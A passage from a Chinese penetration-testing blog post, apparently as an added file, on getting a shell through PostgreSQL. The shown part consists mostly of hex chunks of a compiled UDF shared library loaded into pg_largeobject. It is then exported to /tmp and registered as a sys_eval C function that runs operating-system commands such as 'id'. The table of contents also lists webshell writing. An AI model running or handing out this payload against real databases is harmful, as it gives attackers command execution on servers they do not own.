00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="string">'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">4</span>, <span class="keyword">decode</span>(<span class="string">'181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">5</span>, <span class="keyword">decode</span>(<span class="string">'d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">9023</span>, <span class="string">'/tmp/testeval.so'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行命令：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(<span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> <span class="string">'/tmp/testeval.so'</span>, <span class="string">'sys_eval'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> <span class="keyword">INPUT</span> IMMUTABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h2><p><a href="http://www.91ri.org/6507.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.91ri.org/6507.html</a></p>
+<p><a href="http://static.hx99.net/static/drops/tips-6449.html" target="_blank" rel="external nofollow noopener noreferrer">http://static.hx99.net/static/drops/tips-6449.html</a></p>
+<p><a href="http://www.voidcn.com/article/p-sunyuemo-nw.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.voidcn.com/article/p-sunyuemo-nw.html</a></p>
+<p><a href="https://www.jianshu.com/p/ba0297da2c2e" target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/ba0297da2c2e</a></p>
+<p><a href="http://www.postgres.cn/docs/9.4/catalog-pg-largeobject.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.postgres.cn/docs/9.4/catalog-pg-largeobject.html</a></p>
+<p><a href="https://github.com/sqlmapproject/udfhack/" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sqlmapproject/udfhack/</a></p>
+
+</div>
+  
+    <div class="copyright">
+    <p>如无特殊说明，均为原创内容。转载请注明出处！</p>
+</div>
+  
+    
+  
+    
+  <nav aria-label="pager" class="nav-pager">
+    <ul class="pager">
+      
+        <li class="previous"><a href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span aria-hidden="true">&larr;</span> Spring Boot Actuators配置不当导致RCE漏洞复现</a></li>
+      
+      
+    </ul>
+  </nav>
+
+  
+    
+  
+    <div id="disqus_thread" class="comment"></div>
+    <script>
+      var disqus_config = function(){
+        this.page.url = 'http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/';
+        this.page.identifier = 'post-渗透测试/渗透中利用postgresql getshell';
+      };
+      (function(){
+        var d = document, s = d.createElement('script');
+        s.src = 'https://JF.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a></noscript>
+  
+
+  
+</article></section>
+      <aside class="col-md-3 sidebar">
+
+  <!--<div id="widget-search" class="widget widget-search">-->
+  <!--<div class="widget-content">-->
+    <!--<form class="form-inline" id="widget-search-form" onsubmit="return false;">-->
+      <!--<div class="form-group">-->
+        <!--<input type="text" class="form-control" id="widget-search-keyword" placeholder="" autocomplete="off" autofocus>-->
+      <!--</div>-->
+      <!--<div class="form-group">-->
+        <!--<button type="submit" class="btn btn-default">搜索</button>-->
+      <!--</div>-->
+    <!--</form>-->
+    <!--<div class="modal fade widget-search-results" id="widget-search-results" tabindex="-1" role="dialog" aria-labelledby="widget-search-results">-->
+      <!--<div class="modal-dialog" role="document">-->
+        <!--<div class="modal-content">-->
+          <!--<div class="modal-body"></div>-->
+        <!--</div>-->
+      <!--</div>-->
+    <!--</div>-->
+  <!--</div>-->
+<!--</div>-->
+
+  <div id="widget-toc" class="widget widget-toc">
+  <h3 class="widget-title">目录</h3>
+  <div class="widget-content">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-postgresql测试环境搭建"><span class="toc-number">2.</span> <span class="toc-text">0x01 postgresql测试环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-读写文件"><span class="toc-number">3.</span> <span class="toc-text">0x02 读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-读文件"><span class="toc-number">3.0.1.</span> <span class="toc-text">1.读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-创建数据表把读到的文件copy入表"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">1.1 创建数据表把读到的文件copy入表:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-利用postgresql大对象处理来读文件"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">1.2 利用postgresql大对象处理来读文件:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-写文件"><span class="toc-number">3.0.2.</span> <span class="toc-text">2.写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-普通文件写入-webshell"><span class="toc-number">3.0.2.1.</span> <span class="toc-text">2.1 普通文件写入(webshell):</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-二进制文件写入-利用大数据对象"><span class="toc-number">3.0.2.2.</span> <span class="toc-text">2.2 二进制文件写入(利用大数据对象):</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-命令执行"><span class="toc-number">4.</span> <span class="toc-text">0x03 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-低版本的命令执行"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">1.1 低版本的命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-高版本的命令执行"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">1.2 高版本的命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考资料"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考资料</span></a></li>
+  </div>
+</div>
+
+  <div class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul>
+        <li><a href="http://blog.j0ck1e.com" title target="_blank" rel="external nofollow noopener noreferrer">蓝建</a></li>
+        <li><a href="https://www.3cac.com" title target="_blank" rel="external nofollow noopener noreferrer">卡</a></li>
+        <li><a href="http://blog.he4rt.me" title target="_blank" rel="external nofollow noopener noreferrer">he4rt</a></li>
+        <li><a href="https://sec.mrfan.xyz" title target="_blank" rel="external nofollow noopener noreferrer">饭先生</a></li>
+        <li><a href="https://www.waitalone.cn" title target="_blank" rel="external nofollow noopener noreferrer">独自等待</a></li>
+        <li><a href="https://www.ch1ng.com" title target="_blank" rel="external nofollow noopener noreferrer">金枪银矛小霸王</a></li>
+        <li><a href="https://www.scanfsec.com" title target="_blank" rel="external nofollow noopener noreferrer">scanf</a></li>
+    </ul>
+</div>
+</aside>
+      <div class="tools"><a href="javascript: void(0)" class="go-to-top" style="display: none;"><i class="fa fa-chevron-circle-up"></i></a></div>
+    </div>
+    <footer id="footer" class="footer">
+  <p>Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. 勿忘初心.</p>
+</footer>
+  </div>
+  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<!-- main scripts -->
+
+<script src="/js/main.js"></script>
+
+<!-- seo -->
+<script>
+
+</script>
+<!-- statistics -->
+<div class="hidden">
+  
+  
+  
+  
+  
+</div>
+</body>
+</html>
